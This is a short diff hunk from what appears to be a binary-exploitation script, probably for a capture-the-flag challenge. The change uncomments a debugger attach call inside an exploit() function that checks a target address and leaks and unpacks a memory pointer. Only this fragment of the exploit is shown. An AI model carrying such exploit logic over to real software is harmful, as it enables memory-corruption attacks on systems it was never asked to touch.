@@ -67,7 +67,7 @@ def exploit():
     info('did it? %x' % victim) 
     assert(victim == 0x602008)
 
-    # attach(r)
+    attach(r)
     leak = view(3)[0x10:]
     leak = uu64(leak)
     info('leak %x' % leak)
